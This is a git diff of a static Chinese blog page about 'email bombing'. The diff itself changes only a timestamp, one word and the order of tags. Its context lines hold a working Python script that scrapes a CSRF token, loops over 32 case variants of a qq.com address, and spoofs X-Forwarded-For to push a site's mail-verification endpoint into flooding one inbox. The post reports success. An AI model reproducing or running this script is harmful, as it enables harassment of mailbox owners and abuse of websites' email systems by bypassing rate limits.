@@ -22,7 +22,7 @@
 <meta property="og:image" content="https://doggy-1253136973.cos.ap-chengdu.myqcloud.com/mail/4.png">
 <meta property="og:image" content="https://doggy-1253136973.cos.ap-chengdu.myqcloud.com/mail/5.png">
 <meta property="og:image" content="https://doggy-1253136973.cos.ap-chengdu.myqcloud.com/mail/6.png">
-<meta property="og:updated_time" content="2019-10-11T00:41:51.930Z">
+<meta property="og:updated_time" content="2019-10-11T00:43:48.541Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="邮箱轰炸">
 <meta name="twitter:description" content="连载了3篇短信轰炸的问题，今天遇到个邮箱轰炸，有点意思，记录一下  某网站注册处如下：  发送邮箱验证码进行注册，报文如下">
@@ -197,7 +197,7 @@
 <li>可以使用大小写绕过邮箱限制</li>
 </ol>
 <p>所以可以写下payload<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#encoding=UTF-8</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    mails = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> itertools.product([<span class="string">'q'</span>,<span class="string">'Q'</span>],[<span class="string">'q'</span>,<span class="string">'Q'</span>],<span class="string">'.'</span>,[<span class="string">'c'</span>,<span class="string">'C'</span>],[<span class="string">'o'</span>,<span class="string">'O'</span>],[<span class="string">'m'</span>,<span class="string">"M"</span>]):</span><br><span class="line">         mails.append(<span class="string">''</span>.join(i))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">32</span>):</span><br><span class="line">        url = <span class="string">"http://xxx/passport/reg/register.html"</span></span><br><span class="line">        headers = &#123;</span><br><span class="line">            <span class="string">"User-Agent"</span>:<span class="string">"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36"</span></span><br><span class="line">        &#125;</span><br><span class="line">        r = requests.get(url,headers=headers)</span><br><span class="line">        content = r.content</span><br><span class="line">        pattern = re.compile(<span class="string">'&lt;input type="hidden" id="csrf" name="_csrf" value="(.*?)"/&gt;'</span>,re.S)</span><br><span class="line">        items = re.findall(pattern,content)</span><br><span class="line">        csrf_token = items[<span class="number">0</span>]</span><br><span class="line">        cookie = r.headers[<span class="string">"Set-cookie"</span>]</span><br><span class="line">        url2 = <span class="string">"http://xxxx/passport/reg/sendMailCode.do"</span></span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">"_csrf"</span>:csrf_token,</span><br><span class="line">            <span class="string">"mail"</span>:<span class="string">"xxxx@"</span>+mails[i]</span><br><span class="line">        &#125;</span><br><span class="line">        headers2 = &#123;</span><br><span class="line">            <span class="string">"Cookie"</span>:cookie,</span><br><span class="line">            <span class="string">"User-Agent"</span>: <span class="string">"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36"</span>,</span><br><span class="line">            <span class="string">"X-Forwarded-For"</span>:<span class="string">"129.0.0."</span>+str(i)</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        r2 = requests.post(url=url2,headers=headers2,data=data)</span><br><span class="line">        <span class="keyword">print</span> r2.text</span><br></pre></td></tr></table></figure></p>
-<p>利用笛卡尔积构造qq.com的大小写结果，csrf去源码获取即可</p>
+<p>利用笛卡尔积构造qq.com的大小写结果，csrf token去源码获取即可</p>
 <p>看下效果，成功～～</p>
 <p><img src="https://doggy-1253136973.cos.ap-chengdu.myqcloud.com/mail/5.png" alt="image"></p>
 <p><img src="https://doggy-1253136973.cos.ap-chengdu.myqcloud.com/mail/6.png" alt="image"></p>
@@ -418,7 +418,7 @@
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">笔记</a>
+                <a href="javascript:void(0)" class="js-tag color5">数据结构</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -426,7 +426,7 @@
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">数据结构</a>
+                <a href="javascript:void(0)" class="js-tag color3">笔记</a>
               </li>
              
               <li class="article-tag-list-item">
